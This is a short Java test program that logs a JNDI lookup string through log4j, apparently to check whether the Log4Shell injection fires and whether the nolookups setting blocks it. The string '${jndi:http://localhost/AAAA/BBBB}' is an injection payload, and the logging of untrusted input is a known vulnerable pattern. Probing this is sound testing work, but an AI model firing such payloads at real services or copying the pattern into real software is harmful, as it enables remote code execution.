import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.Level;
public class HelloLog {

    private static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        String userInput = "${jndi:http://localhost/AAAA/BBBB}";

        // passing user input into the logger
        logger.info("Test: "+userInput);

        // %m{nolookups} has no effect for the following line
        // logger.printf(Level.INFO,"Test: %s", userInput);
    }
}

